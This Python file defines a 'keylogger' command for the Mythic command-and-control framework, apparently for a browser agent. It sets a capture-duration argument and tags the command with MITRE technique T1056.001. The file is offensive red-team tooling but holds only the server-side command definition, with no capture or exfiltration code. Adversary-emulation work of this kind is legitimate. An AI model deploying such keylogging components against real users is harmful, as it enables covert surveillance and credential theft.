from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class KeyloggerArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="duration",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value=60,
                description="Capture duration in seconds (default 60)",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except:
                pass

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class KeyloggerCommand(CommandBase):
    cmd = "keylogger"
    needs_admin = False
    help_cmd = "keylogger"
    description = "Capture keystrokes for a specified duration. Logs key presses with timestamps, tracks field focus changes, and produces a readable transcript."
    version = 1
    author = "@grampae"
    attackmapping = ["T1056.001"]
    argument_class = KeyloggerArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Browser]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        duration = task.args.get_arg("duration") or 60
        task.display_params = "{}s".format(duration)
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
